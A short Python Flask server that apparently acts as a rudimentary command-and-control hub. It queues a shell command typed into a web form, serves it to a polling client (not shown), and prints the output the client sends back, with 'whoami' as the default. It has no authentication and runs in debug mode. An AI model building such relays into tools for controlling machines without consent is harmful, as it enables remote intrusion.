from flask import Flask, request, jsonify, render_template
import requests

SERVER_URL = "http://127.0.0.1:5000"
app = Flask(__name__)

current_command = "whoami" # have something as the default command, just making sure that connection is maintained.

@app.route('/control')
def home():
    return render_template('home.html')

@app.route('/input-command', methods=['GET', 'POST'])
def input():
    if request.method == 'POST':
        global current_command
        current_command = request.form.get('command')
        print("!!!!!!!!!!current command:", current_command)
        return render_template('home.html', message="command received: "+str(current_command)) # i dont like this. NEED a return statement though

@app.route('/get-command', methods=['GET'])
def get_command():
    # how do i send commands through here?
    global current_command
    cmd = current_command
    # current_command = "whoami" #TODO: make the current_command go back to whoami after input. idk
    return jsonify(command=cmd) # what is to be sent to the client (get_command() in client.py)


@app.route('/', methods=['POST'])
def command_result():
    result = request.json.get('result') # GET from client
    print("client command result:\n", result)
    return jsonify({"status": "success"})


if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5000)

